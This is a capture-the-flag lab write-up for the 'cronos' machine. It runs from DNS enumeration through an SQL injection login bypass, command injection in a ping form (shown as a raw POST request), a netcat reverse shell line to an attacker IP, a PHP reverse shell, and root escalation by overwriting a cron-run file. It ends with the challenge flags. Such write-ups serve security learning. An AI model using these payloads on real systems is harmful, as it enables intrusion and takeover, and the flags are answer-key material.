# 10.10.10.13 - cronos 
## port 80 open

## port 53 dns open
### zone transfer using the box name cronos.htb
- add the following to /etc/hosts file
```
cronos.htb.
admin.cronos.htb.
ns1.cronos.htb.        
www.cronos.htb.
```

### cronos.htb. / www.cronos.htb.
- Links on the website all go to real active websites 
	* laravel

### admin.cronos.htb.
- login page 
	* cant tell if the ad on the page is supposed to be there
- WE HAVE A SQL INJECTION
- Fairly simple actually
	* reading the web app penetration testers book is helping out
```
admin' or 1=1; -- -
```

### ns1.cronos.htb.
- brings back to the apache default page
	* going to gobust just incase

## admin.cronos.htb - SQLi admin login
- brought to a page that executes ping and trace route with the ip address of a server
	* burpsuite and see if I can change the command executed

### POC
```
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb.
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://admin.cronos.htb./welcome.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Connection: close
Cookie: PHPSESSID=1877au2gpjt18cjc876fitt4l2
Upgrade-Insecure-Requests: 1

command=which+nc&host=10.10.14.19
```
- Able to cat /etc/passwd
- Changed the command in the post request

```
	<input type="text" name="host" value="8.8.8.8"/>
	<input type="submit" value="Execute!"/>
	</form>
			/bin/nc<br>
		      <p><a href = "logout.php">Sign Out</a></p>
   </body>
```
- Can see that nc exists as a poc to reach out for a reverse shell

```
nc -e /bin/sh 10.10.14.19 1985
```
- and just listen on the port and we should get a shell
	* Url encoded 3 times and it failed - unable to reach out via nc

### php reverse shell
- try to wget a test file using python simplehttp
	* Successful in grabing and locating the text.txt file under admin.cronos.htb.
- Successful in grabbing rev-shell.php and executing for reverse shell 

## User - www-data

#### Steps to get a normal acting shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl-z 
stty raw -echo
fg

export TERM=screen
stty rows # columns #

```
- used wget to grab LinEnum.sh onto the webserver and ran it
	* User trying to priv esc too is noulis
	* is part of sudoers
```
d=1000(noulis) gid=1000(noulis) groups=1000(noulis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
```
- Look through the files of cronos.htb. and see if there are any passwords or leverage
- Looking though the linenum there is a crontab running every minute - hence the name of the box
```
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

```
## WIN
- Because the file artisan is being run as user ROOT using PHP as the command to run the file as I can copy over the original artisan file with a php reverse shell and wait for crontab to run the file on the passing minute
	* easy win

### user.txt
```
root@cronos:/home/noulis# cat user.txt 
51d236438b333970dbba7dc3089be33b
```
### root.txt
```
root@cronos:~# cat root.txt 
1703b8a3c9a8dde879942c79d02fd3a0

```
